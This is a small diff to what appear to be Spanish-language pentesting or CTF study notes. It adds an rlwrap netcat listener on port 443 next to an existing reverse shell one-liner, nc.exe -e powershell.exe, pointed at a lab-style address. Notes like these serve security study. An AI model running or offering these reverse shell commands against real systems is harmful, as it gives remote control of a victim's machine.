@@ -3476,6 +3476,9 @@ De donde s4vitar baja su nc.exe
 Mejor usa powershell
 
 ```
+rlwrap -cAr nc -lnvp 443
+
+
 nc.exe -e powershell.exe 10.10.14.80 443
 ```
 
